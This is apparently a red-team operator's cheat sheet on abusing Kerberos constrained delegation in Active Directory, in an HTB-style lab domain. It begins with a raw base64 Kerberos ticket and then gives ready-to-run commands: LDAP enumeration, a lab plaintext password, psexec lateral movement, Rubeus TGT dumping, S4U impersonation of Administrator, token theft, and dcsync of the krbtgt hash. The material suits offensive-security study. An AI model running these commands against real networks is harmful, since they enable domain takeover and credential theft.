
```
doIFhDCCBYCgAwIBBaEDAgEWooIEjDCCBIhhggSEMIIEgKADAgEFoQ4bDFBBSU5URVJTLkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMUEFJTlRFUlMuSFRCo4IERDCCBECgAwIBEqEDAgECooIEMgSCBC7ozaU6RnSZQmyhsOMQs/guNw4J6Qf1GhkrWEUd/3yA8AC4JG7sl4jeV1jwlxeRQvKkKYAJb+CrF6VvAks0TSOplp002UF+qcZmdCpiu/XLehsUb1F03Wsa/09ZiXeaO1uWS4HQs3AXZwRmoSKUvDM2c253Jl1fuqI+Mu22Igf/4MEHrZkm+zNhkbRcL+yJpFqxVafSLECM5zVJlTabueJQpuA8bugBWfX5ouRB4k1AtXVVkvEPAZnK81Yf8gGgHqjV7DwynyXYUPOE0RrgoCxgIrPms9EkvJtbWGQj1dqOMxVTZRuPmlxkIQ6LjZqLeGwVk3pCytbnKpv47ATWwW9TFEvT4IYQWbIIkgTjqwIuS+ht9oNPxzDjRx5PpZrtV/PaUMANF6COSKr9QeN1j2YqlrRVxiNabVcrWLfWLGveK1yYyJS0GZkAMOVgaVaTEuJrrfpXoSlqKbLwAXHLjbL7GvSkSU33YUYKZRObbLOkFOlyVLdzhOrCITAJvdTC2jqMwhfhEMBhqY/XSmHqYdZztUmUIDYVzMtE3mp24VWNbFjP/SgFDgxm6fEPPx2ahc708Ra11tXmxCAwy5E5Q6JpsGMK9YBWFNCNUnZZbkGhjZ7Nzp3pCWSVoKrvTA2E0mUe5NhNh7ApeJ1p3Zz8XXn1kPnFKdIt2h1txpYZ2iOwWZHrZXQxbR5yh0OFcihXpb3xTb/c7bpJk9JCyA62VU6ZSN/unXRF5Pm4ts+XxOQ5HGielWbUq59MABg0U804jLYPO691xn3DI8oUgXSV6nmdJQQAJic0oNx4fPicqX6k/4qoR96QjGFzSNppEu60+YzilQLWbXKLfwINaCEeptj7Fj7exyc++mI+XBsHPN34Pqu0NPgKqmWpwGEBYL9HvsdATLBReK8B6TQXdWQgJyqzupeKkQJi3ZCNzrwmLg5CI9yHCVd6L4+xUMQAvC3tjhhFHNN61TM2z1/x2p6FrGOw+g+5VqhgXXAMn/h9OaC7BE5k3XpzgehE6Tv9jsXNkocDc4zwRWy1knbFMWc/uPWhNMBDlGUeGvJwq0vBM6JYJlY9a5NdtPO1jyl3sbheEoCbo496cJRdLnnKLoclS3s+PlNWXxARXC/llBfiThOL5tAcdWX3NtWSC6kalV3tx+Mmxjb5r8qcxGXQkIuVYoHk7/lHwKBSlzLGIgUFUDJ8SMSmuV3Y8MgfHMFFcjJRkjnr7TSxMX4GwgSk3T5E3iiXyYHU6+IocM5aYvgtJfCjwNQdM2+9Wn0e7IIijvJrI5GNwBSEVBzusfhqF+UKnXesxV0YhQIOKLv0hiQ4XZH1BnYL8RTeP3yP/3kxtWpv7htAd/ALq/Pz1A0U8wJRR0UJoDdJVLYiRnVRL3qLd8bdPVIb4MoG09eSIP2CgJBtgasEewo0Q1a0BJPrE4fDyaOB4zCB4KADAgEAooHYBIHVfYHSMIHPoIHMMIHJMIHGoCswKaADAgESoSIEIGgV6MQExEPnS7NkgVESHEMMlDveeI/IaBcBmCrL5ut1oQ4bDFBBSU5URVJTLkhUQqISMBCgAwIBAaEJMAcbBWJsYWtlowcDBQBA4QAApREYDzIwMjUwODE0MDUxOTQ5WqYRGA8yMDI1MDgxNDE1MTk0OVqnERgPMjAyNTA4MjEwNTE5NDlaqA4bDFBBSU5URVJTLkhUQqkhMB+gAwIBAqEYMBYbBmtyYnRndBsMUEFJTlRFUlMuSFRC
```

##### Constrained Delegation
Search for computers with Constrained Delegation (`msDS-AllowedToDelegateTo` not set to null)
```powershell
ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo
```

Check the UAC value to see if protocol transitioning is possible 
```powershell
ldapsearch (&(samAccountType=805306369)(samaccountname=DUB-WEB-1$)) --attributes userAccountControl
```

We want true
```powershell
[Convert]::ToBoolean(16781312 -band 16777216)
```

Within SYSTEM level beacon on Constrained Delegation host, dump TGT for the computer account
```powershell
make_token CONTOSO\rsteel Passw0rd!
jump psexec64 lon-ws-1 smb

execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e7  /service:krbtgt /nowrap
```


> Couple options here: 

1.  Perform the S4U abuse to obtain a usable service ticket using service name substitution

```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:lon-ws-1$ /msdsspn:time/lon-dc-1.contoso.com /altservice:cifs /impersonateuser:Administrator /nowrap /ticket:
```

> Use the FQDN for the services to avoid oopsies

2. Perform the S4U abuse to obtain a usable service ticket for **a service listed in the `msDS-AllowedToDelegateTo`** value,

```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:LON-WKSTN-1$ /msdsspn:ldap/lon-dc-1.contoso.com /impersonateuser:Administrator /nowrap /ticket:
```

---

 Inject the ticket into a sacrificial logon session.
```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:CONTOSO.COM /username:Administrator /password:FakePass /ticket:
```

 Impersonate the process and verify
```powershell
steal_token [PID]
run klist

ls \\lon-fs-1\c$
dcsync CONTOSO.COM CONTOSO\krbtgt
```